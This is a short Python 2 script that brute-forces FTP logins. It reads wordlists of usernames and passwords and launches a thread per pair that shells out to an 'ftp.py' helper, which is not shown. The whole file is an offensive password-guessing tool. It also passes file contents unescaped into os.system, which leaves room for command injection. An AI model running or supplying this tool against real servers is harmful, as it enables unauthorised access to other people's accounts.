import os
import time
import threading

class mythread(threading.Thread):
      def __init__(self,command):
          threading.Thread.__init__(self)
          self.command=command
      def run(self):
          kk=os.system(self.command)
    
if __name__ =='__main__':          
  ushand=open("user.txt","r")
  pshand=open("passwd.txt","r")
  listuser=[]
  listpass=[]
  for us in open("user.txt","r"):
     lineus=ushand.readline().strip('\n')
     listuser.append(lineus)
  for ps in open("passwd.txt","r"):
     lineps=pshand.readline().strip('\n')
     listpass.append(lineps)
  for i in listuser:
      for j in listpass:
		  command ="ftp.py %s %s"%(i,j)
		  print command
		  my_thread=mythread(command)
		  my_thread.start()
		  time.sleep(0.1)


